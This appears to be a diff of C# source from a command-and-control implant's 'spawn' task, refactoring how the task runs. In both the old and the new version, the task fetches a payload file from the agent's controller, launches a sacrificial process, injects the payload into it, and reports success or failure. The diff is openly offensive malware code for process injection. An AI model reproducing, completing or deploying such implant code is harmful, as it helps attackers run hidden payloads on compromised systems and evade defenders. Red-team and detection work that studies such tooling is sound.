@@ -30,46 +30,43 @@ namespace Tasks
         {
         }
 
-        public override void Kill()
-        {
-            base.Kill();
-        }
 
-        public override ST.Task CreateTasking()
+        public override void Start()
         {
-            return new ST.Task(() =>
-            {
-                TaskResponse resp;
-                SpawnParameters parameters = _jsonSerializer.Deserialize<SpawnParameters>(_data.Parameters);
-                if (_agent.GetFileManager().GetFile(
+            TaskResponse resp;
+            SpawnParameters parameters = _jsonSerializer.Deserialize<SpawnParameters>(_data.Parameters);
+            if (_agent.GetFileManager().GetFile(
                     _cancellationToken.Token,
                     _data.ID,
                     parameters.Template,
                     out byte[] fileBytes))
+            {
+                var startupArgs = _agent.GetProcessManager().GetStartupInfo();
+                var proc = _agent.GetProcessManager().NewProcess(startupArgs.Application, startupArgs.Arguments, true);
+                if (proc.Start())
                 {
-                    var startupArgs = _agent.GetProcessManager().GetStartupInfo();
-                    var proc = _agent.GetProcessManager().NewProcess(startupArgs.Application, startupArgs.Arguments, true);
-                    if (proc.Start())
+                    if (proc.Inject(fileBytes))
                     {
-                        if (proc.Inject(fileBytes))
-                        {
-                            resp = CreateTaskResponse($"Successfully injected into {startupArgs.Application} ({proc.PID})", true);
-                        } else
-                        {
-                            resp = CreateTaskResponse("Failed to inject into sacrificial process.", true, "error");
-                        }
-                    } else
-                    {
-                        resp = CreateTaskResponse("Failed to start sacrificial process.", true, "error");
+                        resp = CreateTaskResponse($"Successfully injected into {startupArgs.Application} ({proc.PID})", true);
                     }
-                } else
-                {
-                    resp = CreateTaskResponse("Failed to fetch file.", true, "error");
+                    else
+                    {
+                        resp = CreateTaskResponse("Failed to inject into sacrificial process.", true, "error");
+                    }
                 }
-                // Your code here..
-                // Then add response to queue
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+                else
+                {
+                    resp = CreateTaskResponse("Failed to start sacrificial process.", true, "error");
+                }
+            }
+            else
+            {
+                resp = CreateTaskResponse("Failed to fetch file.", true, "error");
+            }
+
+            // Your code here..
+            // Then add response to queue
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
 }
